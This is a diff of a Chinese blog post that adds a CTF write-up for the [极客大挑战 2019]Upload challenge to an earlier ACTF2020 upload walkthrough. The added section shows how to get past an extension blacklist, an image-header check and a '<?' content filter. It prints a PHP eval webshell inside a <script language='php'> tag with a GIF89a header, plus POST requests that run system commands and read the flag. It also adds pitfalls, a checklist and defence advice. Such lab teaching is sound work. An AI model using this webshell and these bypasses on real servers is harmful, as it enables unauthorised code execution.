 <h3 id="1-3-怎么把-phtml-发出去（不用-Burp）"><a href="#1-3-怎么把-phtml-发出去（不用-Burp）" class="headerlink" title="1.3 怎么把 .phtml 发出去（不用 Burp）"></a>1.3 怎么把 <code>.phtml</code> 发出去（不用 Burp）</h3><p>这是新手最容易卡住的地方：<strong>页面上只有一个按钮，我怎么传别的后缀？</strong></p>
@@ -558,7 +613,199 @@
 
 <p>命令执行成功，题目结束。</p>
 <hr>
-<h2 id="2-我踩过的坑"><a href="#2-我踩过的坑" class="headerlink" title="2. 我踩过的坑"></a>2. 我踩过的坑</h2><p>这一章是真实过程，不是事后润色。每个坑都附上现象和正确做法，方便对照排查。</p>
+<h2 id="2-极客大挑战-2019-Upload"><a href="#2-极客大挑战-2019-Upload" class="headerlink" title="2. [极客大挑战 2019]Upload"></a>2. [极客大挑战 2019]Upload</h2><h3 id="2-1-观察题目"><a href="#2-1-观察题目" class="headerlink" title="2.1 观察题目"></a>2.1 观察题目</h3><p>页面同样只有一个上传框：</p>
+<p><img src="/2026/10/24/web-ctf-upload/01-upload-form.png" alt="极客大挑战 2019 的上传页面"></p>
+<p>它和第一题最大的不同是<strong>回显方式</strong>：所有提示都直接怼在页面上，比如 <code>NOT! php!</code>、<code>Don&#39;t lie to me, it&#39;s not image at all!!!!</code>、<code>NO! HACKER! your file included &#39;&lt;?&#39;</code>。这些标语本身就是线索——每一句对应一层检查。</p>
+<p>先记下几个基本信息：</p>
+<table>
+<thead>
+<tr>
+<th>线索</th>
+<th>值</th>
+<th>含义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>处理脚本</td>
+<td><code>/upload_file.php</code></td>
+<td>抓包可见的上传接口</td>
+</tr>
+<tr>
+<td>文件字段名</td>
+<td><code>file</code></td>
+<td>构造请求时要用（第一题是 <code>upload_file</code>）</td>
+</tr>
+<tr>
+<td>上传目录</td>
+<td><code>/upload/</code></td>
+<td>从访问路径直接看出来</td>
+</tr>
+<tr>
+<td>运行环境</td>
+<td><code>X-Powered-By: PHP/5.5.9-1ubuntu4.29</code></td>
+<td>PHP 5，支持 <code>&lt;?&gt;</code>、<code>&lt;script language=&quot;php&quot;&gt;</code> 这些老写法</td>
+</tr>
+</tbody></table>
+<div class="note warning"><p>这道题<strong>没有</strong>把文件名 md5 化，文件名基本原样保存。第一题里“自己算 md5 找路径”的技巧在这里用不上。</p>
+</div>
+
+<h3 id="2-2-第一层：后缀黑名单"><a href="#2-2-第一层：后缀黑名单" class="headerlink" title="2.2 第一层：后缀黑名单"></a>2.2 第一层：后缀黑名单</h3><p>照例先直接传 <code>up.php</code>。用 Burp 抓包，把 <code>filename</code> 改成 <code>up.php</code>：</p>
+<p><img src="/2026/10/24/web-ctf-upload/02-php-blacklist.png" alt="传 php 被拦"></p>
+<p>回显 <code>NOT! php!</code> ——后缀被黑名单拦下了。</p>
+<p>那就换个后缀：<code>filename</code> 改成 <code>up.jpg</code>，内容先随便塞一段脚本。这次后缀过了，却立刻撞上第二条标语：</p>
+<p><img src="/2026/10/24/web-ctf-upload/03-not-image.png" alt="不是图片"></p>
+<p><code>Don&#39;t lie to me, it&#39;s not image at all!!!!</code> 说明服务端还会<strong>检查文件内容是不是真的图片</strong>。到这一步可以确定，它至少叠了三层检查：</p>
+<table>
+<thead>
+<tr>
+<th>顺序</th>
+<th>检查点</th>
+<th>拦截时的回显</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1</td>
+<td>后缀黑名单（<code>php</code> 等）</td>
+<td><code>NOT! php!</code></td>
+</tr>
+<tr>
+<td>2</td>
+<td>文件内容像不像图片</td>
+<td><code>Don&#39;t lie to me, it&#39;s not image at all!!!!</code></td>
+</tr>
+<tr>
+<td>3</td>
+<td>内容里有没有 <code>&lt;?</code></td>
+<td><code>NO! HACKER! your file included &#39;&lt;?&#39;</code></td>
+</tr>
+</tbody></table>
+<h3 id="2-3-第二层：给文件加一个图片头"><a href="#2-3-第二层：给文件加一个图片头" class="headerlink" title="2.3 第二层：给文件加一个图片头"></a>2.3 第二层：给文件加一个图片头</h3><p>对付“内容像不像图片”，最省事的就是加文件头，<code>GIF89a</code> 就够：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">&lt;script language=&quot;php&quot;&gt;@eval($_POST[&#x27;a&#x27;]);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p><code>GIF89a</code> 打头，<code>getimagesize()</code> &#x2F; <code>finfo</code> 这类检查基本都能骗过。上传：</p>
+<p><img src="/2026/10/24/web-ctf-upload/04-upload-success.png" alt="上传成功"></p>
+<p>页面回显 <code>上传文件名：up.jpg</code> ——<strong>传上去了，但存成了 <code>.jpg</code></strong>。</p>
+<div class="note danger"><p>这里很容易误判成“通关了”。<code>.jpg</code> 只是通过了后缀检查，服务器不会解析它。<strong>能上传 ≠ 能执行</strong>，这个坑第一题已经踩过一次。</p>
+</div>
+
+<h3 id="2-4-第三层：内容里不能出现"><a href="#2-4-第三层：内容里不能出现" class="headerlink" title="2.4 第三层：内容里不能出现 &lt;?"></a>2.4 第三层：内容里不能出现 <code>&lt;?</code></h3><p>想执行，后缀必须换成服务器会解析的。把 <code>filename</code> 改成 <code>up.phtml</code>，内容先用最标准的 PHP：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">&lt;?php echo &#x27;UP_OK&#x27;; ?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>结果：</p>
+<p><img src="/2026/10/24/web-ctf-upload/05-content-blacklist.png" alt="内容黑名单拦截"></p>
+<p><code>NO! HACKER! your file included &#39;&lt;?&#39;</code> ——服务端在<strong>内容里做字符串匹配</strong>，看到 <code>&lt;?</code> 就拒绝。</p>
+<p>注意这条规则的性质：它不判断“这是不是恶意代码”，只判断“文件里有没有这个字符串”。<strong>凡是字符串黑名单，就一定存在等价写法可以绕过去。</strong></p>
+<h3 id="2-5-绕过：改用"><a href="#2-5-绕过：改用" class="headerlink" title="2.5 绕过：改用 &lt;script language=&quot;php&quot;&gt;"></a>2.5 绕过：改用 <code>&lt;script language=&quot;php&quot;&gt;</code></h3><p>0.5 节提过，PHP 5 支持 <code>&lt;script language=&quot;php&quot;&gt;</code> 标签，作用和 <code>&lt;?php</code> 完全一样，但一个 <code>&lt;?</code> 都不含：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">&lt;script language=&quot;php&quot;&gt;@eval($_POST[&#x27;a&#x27;]);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>从十六进制看，两个检查点同时满足——开头 <code>47 49 46 38 39 61</code> 就是 <code>GIF89a</code>，后面才是脚本：</p>
+<p><img src="/2026/10/24/web-ctf-upload/06-script-tag-hex.png" alt="木马文件十六进制"></p>
+<table>
+<thead>
+<tr>
+<th>检查</th>
+<th>看到什么</th>
+<th>结果</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>文件头像图片</td>
+<td>前 6 字节 <code>GIF89a</code></td>
+<td><mark class="label success">通过</mark></td>
+</tr>
+<tr>
+<td>内容不含 <code>&lt;?</code></td>
+<td>只有 <code>&lt;script language=&quot;php&quot;&gt;</code></td>
+<td><mark class="label success">通过</mark></td>
+</tr>
+</tbody></table>
+<div class="note success"><p>这个标签是 <strong>PHP 5 专属</strong>，PHP 7.0 起被彻底移除。题目是 2019 年的，<code>X-Powered-By: PHP/5.5.9-1ubuntu4.29</code> 也对得上，正好能用。</p>
+</div>
+
+<h3 id="2-6-定位文件，确认它是真解析"><a href="#2-6-定位文件，确认它是真解析" class="headerlink" title="2.6 定位文件，确认它是真解析"></a>2.6 定位文件，确认它是真解析</h3><p>这道题基本原样保存文件名，路径就是 <code>/upload/</code>。不过我第一版请求把后缀拼成了 <code>up.phmtl</code>：</p>
+<p><img src="/2026/10/24/web-ctf-upload/07-phmtl-request.png" alt="后缀拼错的请求"></p>
+<p>服务器照样回“上传成功”，文件也确实落盘了——因为 <code>phmtl</code> 不在黑名单里。访问看看：</p>
+<p><img src="/2026/10/24/web-ctf-upload/08-phmtl-url.png" alt="访问 phmtl"></p>
+<p>页面只显示一个 <code>GIF89a</code>。文件在，但<strong>没有被 PHP 解析</strong>，<code>&lt;script language=&quot;php&quot;&gt;</code> 又只是浏览器不认识的 script 标签，于是除了文件头什么都看不到。</p>
+<p>把后缀改对，重新传 <code>up.phtml</code>，再访问：</p>
+<p><img src="/2026/10/24/web-ctf-upload/09-parse-check.png" alt="访问 phtml"></p>
+<p><strong>同样是只剩 <code>GIF89a</code>。</strong> 这两种情况从页面上根本分不清：</p>
+<table>
+<thead>
+<tr>
+<th>现象</th>
+<th>真实原因</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>只看到 <code>GIF89a</code></td>
+<td>后缀不被解析，文件被当静态文件原样返回</td>
+</tr>
+<tr>
+<td>只看到 <code>GIF89a</code></td>
+<td>后缀被解析，PHP 标签被吃掉、<code>eval</code> 没收到参数所以没有输出，剩下的就是文件头</td>
+</tr>
+</tbody></table>
+<p>所以别用“页面有没有变化”来判断解析——<strong>带参数发一次请求</strong>才算数，这正是坑 8 说的。</p>
+<h3 id="2-7-传参执行，拿-flag"><a href="#2-7-传参执行，拿-flag" class="headerlink" title="2.7 传参执行，拿 flag"></a>2.7 传参执行，拿 flag</h3><p>木马是 <code>@eval($_POST[&#39;a&#39;])</code>，<code>a</code> 里要传的是 <strong>PHP 代码</strong>（见坑 3、坑 4）。用 Burp Repeater 对着上传后的文件发请求：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/upload/up.phtml</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line"><span class="language-ini"><span class="attr">a</span>=system(<span class="string">&#x27;ls%20-al&#x27;</span>)<span class="comment">;</span></span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/10/24/web-ctf-upload/10-exec-ls.png" alt="执行 ls"></p>
+<p>响应里 <code>GIF89a</code> 之后跟着完整的目录列表，命令执行成功。顺带还能看到 <code>upload/</code> 里堆满了别人留下的 <code>1.jpg</code>、<code>1.phml</code>、<code>2.php.aaa</code>、<code>233.php%00.jpg</code> 之类的文件——<strong>这道题的公开解法都沉淀在这个目录里</strong>，卡壳时不妨拿来对照。</p>
+<p>读 flag：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/upload/up.phtml</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line"><span class="language-ini"><span class="attr">a</span>=system(<span class="string">&#x27;cat%20/flag&#x27;</span>)<span class="comment">;</span></span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/10/24/web-ctf-upload/11-flag.png" alt="拿到 flag"></p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GIF89aCTF2&#123;7a3e75f-94e0-44bc-9619-4a13d4c9e1ed&#125;</span><br></pre></td></tr></table></figure>
+
+<p>开头的 <code>GIF89a</code> 是文件头文本，<code>CTF2&#123;...&#125;</code> 才是命令输出——这也再次说明木马真的被执行了。</p>
+<h3 id="2-8-两题对比"><a href="#2-8-两题对比" class="headerlink" title="2.8 两题对比"></a>2.8 两题对比</h3><table>
+<thead>
+<tr>
+<th>维度</th>
+<th>ACTF2020 Upload</th>
+<th>极客大挑战 2019 Upload</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>前端</td>
+<td>后缀白名单，JS 拦 <code>.phtml</code></td>
+<td>后缀黑名单</td>
+</tr>
+<tr>
+<td>后端后缀</td>
+<td>黑名单漏了 <code>phtml</code> &#x2F; <code>pht</code></td>
+<td>黑名单拦 <code>php</code>，放 <code>phtml</code></td>
+</tr>
+<tr>
+<td>内容检查</td>
+<td>无</td>
+<td>先查图片头，再查 <code>&lt;?</code></td>
+</tr>
+<tr>
+<td>文件名</td>
+<td><code>md5(原文件名)</code></td>
+<td>原名保存</td>
+</tr>
+<tr>
+<td>为什么能执行</td>
+<td><code>.htaccess</code> 把 <code>.phtml</code> 映射给 PHP</td>
+<td>服务器本身就解析 <code>.phtml</code></td>
+</tr>
+<tr>
+<td>关键 payload</td>
+<td><code>&lt;?php system($_GET[&quot;c&quot;]); ?&gt;</code></td>
+<td><code>&lt;script language=&quot;php&quot;&gt;@eval($_POST[&#39;a&#39;]);&lt;/script&gt;</code></td>
+</tr>
+<tr>
+<td>怎么定位文件</td>
+<td>看回显，或自己算 md5</td>
+<td>直接 <code>/upload/原名</code></td>
+</tr>
+</tbody></table>
+<p>一句话总结：<strong>第一题卡在“哪个后缀会被解析”，第二题卡在“文件内容怎么写才不被拦”。</strong></p>
+<hr>
+<h2 id="3-我踩过的坑"><a href="#3-我踩过的坑" class="headerlink" title="3. 我踩过的坑"></a>3. 我踩过的坑</h2><p>这一章是真实过程，不是事后润色。每个坑都附上现象和正确做法，方便对照排查。</p>
 <table>
 <thead>
 <tr>
@@ -596,6 +843,16 @@
 <td>6</td>
 <td>把“上传成功”当成“木马可用”</td>
 <td>按四步逐层验证</td>
+</tr>
+<tr>
+<td>7</td>
+<td>后缀拼成 <code>phmtl</code>，上传“成功”但不解析</td>
+<td>核对拼写，<code>phtml</code> 不是 <code>phmtl</code></td>
+</tr>
+<tr>
+<td>8</td>
+<td>页面只剩 <code>GIF89a</code>，判断不了执行没执行</td>
+<td>带参数发一次请求验证</td>
 </tr>
 </tbody></table>
 <h3 id="坑-1：把木马改名成-jpg-去骗前端"><a href="#坑-1：把木马改名成-jpg-去骗前端" class="headerlink" title="坑 1：把木马改名成 .jpg 去骗前端"></a>坑 1：把木马改名成 <code>.jpg</code> 去骗前端</h3><mark class="label danger">现象</mark> 本地把 `x.jpg` 传上去，提示 `Upload Success`，但访问 `upload/3e602dd0....jpg` 什么也不执行。
@@ -686,8 +943,20 @@
 <li>路径是否正确（md5 算一下，或看回显）；</li>
 <li>最后才上命令执行。</li>
 </ol>
+<h3 id="坑-7：后缀拼错，上传“成功”却永远不解析"><a href="#坑-7：后缀拼错，上传“成功”却永远不解析" class="headerlink" title="坑 7：后缀拼错，上传“成功”却永远不解析"></a>坑 7：后缀拼错，上传“成功”却永远不解析</h3><mark class="label danger">现象</mark> 传 `up.phmtl`，提示上传成功，访问后页面只有一个 `GIF89a`，命令怎么都执行不了。
+
+<mark class="label warning">原因</mark> 黑名单拦的是 `php` 这类后缀，`phmtl` 不在名单里，所以顺利落盘；可服务器同样不认识 `phmtl`，不会交给 PHP 解析。**“不在黑名单里”和“会被解析”是两回事。**
+
+<mark class="label success">正确做法</mark> 构造请求前核对一遍后缀拼写。拿不准就把可执行后缀挨个试一遍（`phtml`、`pht`、`php5`、`php7`……），先用 `echo` 版本确认能解析，再上真 payload。
+
+<h3 id="坑-8：只看到-GIF89a，判断不了到底执行没执行"><a href="#坑-8：只看到-GIF89a，判断不了到底执行没执行" class="headerlink" title="坑 8：只看到 GIF89a，判断不了到底执行没执行"></a>坑 8：只看到 <code>GIF89a</code>，判断不了到底执行没执行</h3><mark class="label danger">现象</mark> 访问 `up.phtml`，页面除了文件头 `GIF89a` 什么都没有。
+
+<mark class="label warning">原因</mark> 两种情况在页面上长得一模一样：一种是被当静态文件原样返回；另一种是 PHP 确实执行了，但 `eval` 没收到参数、什么也没输出，页面剩下的只有文件头文本。
+
+<mark class="label success">正确做法</mark> 别靠“页面有没有变化”猜。直接带参数发一次请求（`a=system('id');`），有输出才算执行；没输出再看响应头里有没有 `X-Powered-By: PHP`。
+
 <hr>
-<h2 id="3-完整流程速查表"><a href="#3-完整流程速查表" class="headerlink" title="3. 完整流程速查表"></a>3. 完整流程速查表</h2><table>
+<h2 id="4-完整流程速查表"><a href="#4-完整流程速查表" class="headerlink" title="4. 完整流程速查表"></a>4. 完整流程速查表</h2><table>
 <thead>
 <tr>
 <th>步骤</th>
@@ -698,7 +967,7 @@
 <tbody><tr>
 <td>1</td>
 <td>看前端拦什么</td>
-<td>读 <code>js/main.js</code>，确认是后缀白名单</td>
+<td>读 <code>js/main.js</code>，确认是白名单还是黑名单</td>
 </tr>
 <tr>
 <td>2</td>
@@ -712,35 +981,40 @@
 </tr>
 <tr>
 <td>4</td>
-<td>判断是否解析</td>
-<td>访问 <code>.phtml</code> 看是否执行</td>
+<td>摸内容检查</td>
+<td>回显 <code>not image</code> → 加 <code>GIF89a</code>；回显 <code>included &#39;&lt;?&#39;</code> → 换 <code>&lt;script language=&quot;php&quot;&gt;</code></td>
 </tr>
 <tr>
 <td>5</td>
+<td>判断是否解析</td>
+<td>访问可执行后缀，再带参数确认</td>
+</tr>
+<tr>
+<td>6</td>
 <td>找根因</td>
 <td>读 <code>.htaccess</code> &#x2F; <code>httpd.conf</code></td>
 </tr>
 <tr>
-<td>6</td>
+<td>7</td>
 <td>传马</td>
-<td><code>GIF89a</code> + <code>&lt;?php system($_GET[&quot;c&quot;]); ?&gt;</code></td>
+<td><code>GIF89a</code> + 一句话 &#x2F; <code>system()</code></td>
 </tr>
 <tr>
-<td>7</td>
+<td>8</td>
 <td>定位文件</td>
 <td>回显路径，或 <code>md5(原文件名).后缀</code></td>
 </tr>
 <tr>
-<td>8</td>
+<td>9</td>
 <td>执行命令</td>
 <td><code>?c=id</code>、<code>?c=cat /flag</code></td>
 </tr>
 </tbody></table>
-<div class="note default"><p><strong>打印版口诀</strong>：看前端拦什么 → 绕过前端 → 摸黑名单 → 判解析 → 传马 → 定位 → 执行。</p>
+<div class="note default"><p><strong>打印版口诀</strong>：看前端拦什么 → 绕过前端 → 摸黑名单 → 摸内容检查 → 判解析 → 传马 → 定位 → 执行。</p>
 </div>
 
 <hr>
-<h2 id="4-新手常见问题"><a href="#4-新手常见问题" class="headerlink" title="4. 新手常见问题"></a>4. 新手常见问题</h2><details class="note info"><summary><p><strong>Q1：页面只能点按钮，我怎么传 <code>.phtml</code>？</strong></p>
+<h2 id="5-新手常见问题"><a href="#5-新手常见问题" class="headerlink" title="5. 新手常见问题"></a>5. 新手常见问题</h2><details class="note info"><summary><p><strong>Q1：页面只能点按钮，我怎么传 <code>.phtml</code>？</strong></p>
 </summary>
 <p>前端校验只是浏览器里的 JS，禁用 JS 或用开发者工具改请求就行。见 1.3。</p>
 
@@ -776,8 +1050,20 @@
 
 </details>
 
+<details class="note info"><summary><p><strong>Q7：提示 <code>NO! HACKER! your file included &lt;?</code> 怎么办？</strong></p>
+</summary>
+<p>内容里有 <code>&lt;?</code>，被字符串黑名单拦了。换一个不含 <code>&lt;?</code> 的等价写法，比如 PHP 5 的 <code>&lt;script language=&quot;php&quot;&gt;...&lt;/script&gt;</code>。见 2.5。</p>
+
+</details>
+
+<details class="note info"><summary><p><strong>Q8：页面只回显 <code>GIF89a</code>，木马到底生效了吗？</strong></p>
+</summary>
+<p>看页面判断不了：可能后缀根本不解析，也可能执行了但没传参。带参数请求一次才有结论。见坑 8。</p>
+
+</details>
+
 <hr>
-<h2 id="5-顺手聊聊怎么防"><a href="#5-顺手聊聊怎么防" class="headerlink" title="5. 顺手聊聊怎么防"></a>5. 顺手聊聊怎么防</h2><table>
+<h2 id="6-顺手聊聊怎么防"><a href="#6-顺手聊聊怎么防" class="headerlink" title="6. 顺手聊聊怎么防"></a>6. 顺手聊聊怎么防</h2><table>
 <thead>
 <tr>
 <th>优先级</th>
@@ -812,6 +1098,11 @@
 </tr>
 <tr>
 <td>★☆☆</td>
+<td><strong>不要用字符串黑名单拦内容</strong></td>
+<td>拦 <code>&lt;?</code> 只是自欺欺人：<code>&lt;script language=&quot;php&quot;&gt;</code>、短标签都能绕，黑名单永远列不全</td>
+</tr>
+<tr>
+<td>★☆☆</td>
 <td><strong>限制大小和数量</strong></td>
 <td>避免被当成存储滥用</td>
 </tr>
@@ -820,10 +1111,11 @@
 </div>
 
 <hr>
-<h2 id="6-总结"><a href="#6-总结" class="headerlink" title="6. 总结"></a>6. 总结</h2><p>这道题虽然简单，但把文件上传的完整链路都覆盖到了：</p>
+<h2 id="7-总结"><a href="#7-总结" class="headerlink" title="7. 总结"></a>7. 总结</h2><p>这两道题虽然都很简单，但合起来把文件上传的完整链路都覆盖到了：</p>
 <ul>
 <li><strong>前端校验不是防线</strong>，绕过它只是第一步；</li>
 <li><strong>“能上传”和“能解析”是两件事</strong>，<code>.pht</code> 和 <code>.phtml</code> 的对比就是最好的例子；</li>
+<li><strong>每一层拦截都有它自己的绕过方式</strong>：后缀黑名单靠漏网后缀，图片头检查靠 <code>GIF89a</code>，内容黑名单靠 <code>&lt;?</code> 的等价写法；</li>
 <li><strong>黑名单天然有遗漏</strong>，而 <code>.htaccess</code> 往往才是决定“为什么偏偏是这个后缀”的最后一环；</li>
 <li><strong>调试时先确认变量</strong>：文件内容对不对、路径对不对、后缀解析不解析，逐层排除，比一上来就怀疑 payload 有效得多。</li>
 </ul>
@@ -845,8 +1137,11 @@
               <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" rel="tag"># 文件上传</a>
               <a href="/tags/%E5%90%8E%E7%BC%80%E7%BB%95%E8%BF%87/" rel="tag"># 后缀绕过</a>
               <a href="/tags/htaccess/" rel="tag"># .htaccess</a>
+              <a href="/tags/%E6%96%87%E4%BB%B6%E5%A4%B4%E4%BC%AA%E9%80%A0/" rel="tag"># 文件头伪造</a>
               <a href="/tags/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/" rel="tag"># 一句话木马</a>
+              <a href="/tags/PHP-%E7%9F%AD%E6%A0%87%E7%AD%BE/" rel="tag"># PHP 短标签</a>
               <a href="/tags/ACTF/" rel="tag"># ACTF</a>
+              <a href="/tags/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/" rel="tag"># 极客大挑战</a>
           </div>
 
         
